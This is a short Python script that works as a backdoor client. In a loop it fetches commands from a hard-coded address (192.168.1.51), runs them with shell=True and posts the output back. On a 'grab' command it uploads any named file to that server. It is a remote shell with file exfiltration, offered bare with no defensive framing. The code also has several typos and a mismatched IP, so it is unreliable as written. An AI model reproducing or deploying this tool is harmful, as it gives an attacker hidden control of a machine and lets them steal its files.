#!/usr/bin/python

import requests
import subprocess
import os
import time


while True:

	req = requests.get('http://192.168.1.51')
	command = req.text

	if 'terminate' in command:
		break





	elif 'grab' in command:

		grab,path=command.split('*') # split it  to two patrs , and store the second one


		if os.path.exist(path): # check the file if already exist
			url = 'http://192.168.1.51/store'  # add /store
			files = {'file': open(path, 'rb')}
			r = requests.post(url, files=files)

		else:
			post_response = request.post(url='http://192.168.1.51', data='[-] file not found')

	else:
		CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdrr=subprocess.PIPE, stdin=subprocess.PIPE)
		post_response = requests.post(url='http://192.168.1.151', data=CND.srdout.read() )
		post_response = requests.post(url='http://192.168.1.151', data=CND.srdout.read() )
	time.sleep(3)

